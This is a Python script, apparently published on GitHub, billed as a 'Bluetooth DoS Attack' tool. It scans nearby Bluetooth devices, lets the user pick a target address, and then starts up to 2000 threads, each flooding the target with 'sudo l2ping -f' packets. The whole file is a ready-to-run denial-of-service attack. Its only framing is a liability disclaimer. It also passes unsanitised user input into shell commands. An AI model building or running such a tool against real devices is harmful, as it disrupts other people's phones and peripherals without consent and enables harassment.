from os import system
from time import sleep
from threading import Thread


target_addr = ""
pack_size   = 0
threads     = 0


def scan_devices():
    system("sudo hcitool scan > targets")


def setup_interface():
    system("sudo rfkill unblock bluetooth")
    system("sudo hciconfig -a hci0 up")


def attack(pack_size, target_addr):
    system(f"sudo l2ping -i hci0 -s {pack_size} -f {target_addr}")


def banner():
    system("clear")
    print("{:.^71}".format("\x1b[37;4mhttps://github.com/DiegoBloise\x1b[0m"))
    print("\x1b[37;36m")
    print("""
    *****       *****            ***                       
     *   *       *   *          *   *                      
     *   *       *   *          *                          
     *   *       *   *          *       ****    ****       
     *   *       ****            ***   *    *  *    *      
     *   *       *   *              *  ******  *           
     *   *       *   *              *  *       *           
     *   * **    *   * **       *   *  *    *  *    *  **  
    *****  **   *****  **        ***    ****    ****   **
    """)
    print("\x1b[0m")
    print("{:.^60}".format("Bluetooth DoS Attack"))
    print()


def main():
    banner()
    print("\x1b[31m* THIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\n* YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK.\n* THE USE IS COMPLETE RESPONSABILITY OF THE END-USER.\n* THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR\nANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.\n")

    if input("Do you agree? [Y/n] ~> ") in ["N", ["n"]]:
        print("Finishing...")
        exit(0)
    else:
        banner()

        print("[*] Turning on bluetooth interface...")
        setup_interface()
        sleep(1)

        banner()

        print("{:>25}".format("[1] Scan nearby devices. "))
        print("{:>25}".format("[2] Entry device address."))
        print()

        choice = int(input("{:>25}".format("Select an option ~> ")))

        if choice == 1:
            while True:
                banner()

                print("[*] Scanning nearby devices...")

                #scan_devices()

                targets_file = open("targets", "r")
                targets_list = targets_file.readlines()
                targets_list.pop(0)
                targets_file.close()

                if len(targets_list) > 0:
                    banner()
                    print("", "-"*53)
                    print("|  Device  |       Adress        |        Name        |")
                    print("", "-"*53)
                    for index in range(len(targets_list)):
                        print(f"    [{index+1}]    | ",  targets_list[index][1:].replace("\t", '  |  '), end="")
                    print("\n", "-"*53)

                    print("[*] Select a target:")

                    try:
                        device_number = int(input("{:>25}".format("Device number ~> ")))-1
                        if device_number not in range(len(targets_list)):
                            print("[!] ERROR: Invalid option.")
                    except:
                        print("[!] ERROR: Device number must be an integer.")
                        exit(0)
                    target_addr = targets_list[device_number][1:18]
                    break
                else:
                    banner()
                    print("[!] No targets found!")
                    input("{:>25}".format("\nPress enter to scan again ~> "))
                    continue
        elif choice == 2:
            target_addr = input("{:>25}".format("Target address ~> "))
            if len(target_addr) < 1:
                print("[!] ERROR: Target address is missing.")
                exit(0)

        banner()

        print("{:>25}".format("[1] Default attack."))
        print("{:>25}".format("[2] Custom attack. "))
        print()

        try:
            choice = int(input("{:>25}".format("Select attack ~> ")))
            if choice not in range(1, 3):
                raise Exception
        except:
            print("[!] ERROR: Invalid option.")
            exit(0)

        if choice == 2:
            try:
                pack_size = int(input("{:>25}".format("Packages size ~> ")))
            except:
                print("[!] ERROR: Packages size must be an integer.")
                exit(0)

            try:
                threads = int(input("{:>25}".format("Threads ~> ")))
            except:
                print("[!] ERROR: Threads must be an integer.")
                exit(0)
        elif choice == 1:
            pack_size = 600
            threads = 2000

        print()
        system("clear")

        print(f"\x1b[31m[*] Starting DOS attack to {target_addr} in 3 seconds...")

        for i in range(0, 3):
            print(f"[*] {3 - i}")
            sleep(1)

        system("clear")
        print("[*] Building threads...\n")

        for i in range(0, threads):
            print(f"[*] Built thread Nº {i + 1}")
            Thread(target=attack, args=[pack_size, target_addr]).start()

        print("[*] Built all threads...")
        print("[*] Starting...")


if __name__ == "__main__":
    try:
        system("clear")
        main()
    except KeyboardInterrupt:
        print("\n[*] Aborted by user.")
        exit(0)
    except Exception as error:
        print(f"[!] ERROR: {error}")
